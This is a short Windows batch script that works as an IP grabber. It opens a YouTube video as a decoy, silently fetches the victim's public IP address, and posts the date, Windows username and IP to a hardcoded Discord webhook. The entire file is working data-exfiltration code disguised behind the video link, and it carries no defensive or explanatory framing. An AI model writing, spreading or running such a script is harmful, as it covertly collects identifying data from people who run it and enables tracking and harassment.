set webhook=https://discord.com/api/webhooks/1210151683339063326/iUEMjfcg06lLuWmI7iFCc5R6gyu4mxubmuuAFxCT-aS3gYiFGoF0H1Sxv78GS9sQPtpC

@echo off

start https://youtu.be/XKqT5f6_bMQ
cls
for /f "tokens=*" %%a in ('curl ifconfig.me -s') do (set publicip=%%a)
curl -d "content='''Date:+%date%+|+Name:+%username%+|+IP:%publicip%'''" -X POST %webhook%